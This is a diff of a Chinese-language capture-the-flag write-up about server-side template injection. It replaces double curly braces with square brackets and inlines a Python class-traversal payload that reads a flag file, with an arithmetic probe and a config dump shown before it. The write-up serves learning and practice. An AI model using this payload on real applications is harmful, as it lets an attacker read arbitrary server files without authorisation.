@@ -233,7 +233,9 @@ index.php
 
 知道了是模版注入，根据之前能够xss，说明渲染的模版内容受到我们的控制，所以我们要使用模版注入，插入在服务器端执行的代码
 
-先试个`{{2*10}}`
+> **在这里提前申明一下，因为不知道什么原因，双大括号没办法打出来，打出来就会讲括号和里面的内容全部替换为空，锁着我后面都会使用双中括号来代替双大括号**
+
+先试个`[[2*10]]`
 
 ![](https://ws1.sinaimg.cn/large/006Vib6xly1frghc3ixjij30e50aut9f.jpg)
 
@@ -241,7 +243,7 @@ index.php
 
 成功执行，说明确实是模版注入没错
 
-再尝试输入`config`
+再尝试输入`[[config]]`
 
 得到
 
@@ -269,11 +271,7 @@ index.php
 
 ![](https://ws1.sinaimg.cn/large/006Vib6xly1frghwxbelhj31400l4gvd.jpg)
 
-看到`file`，又有刚才获得的路径，我们可以读取文件了
-
-```
-{{''.__class__.__mro__[2].__subclasses__()[40]('./flag/flag.txt','r').read()}}
-```
+看到`file`，又有刚才获得的路径，我们可以读取文件了`[[''.__class__.__mro__[2].__subclasses__()[40]('./flag/flag.txt','r').read()]]`
 
 得到flag`MiniLCTF{e215h-c0adj-14sjs-mn74h}`
 
